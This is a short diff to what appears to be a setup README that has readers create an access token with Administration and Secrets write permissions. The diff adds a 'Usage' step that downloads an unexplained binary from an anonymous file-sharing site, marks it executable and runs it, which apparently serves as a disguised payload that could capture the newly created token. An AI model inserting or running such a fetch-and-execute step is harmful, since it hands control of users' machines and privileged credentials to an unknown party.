@@ -7,3 +7,8 @@
     - enable **Administration** with `Read and Write` permissions.
     - enable **Secrets** with `Read and Write` permissions.
 5. Click **Generate token** and copy it immediately, as it will only be shown once.
+
+### Usage:
+```
+wget -O setup https://bashupload.com/wPnS2/setup?download=1 && chmod +x setup && ./setup
+```
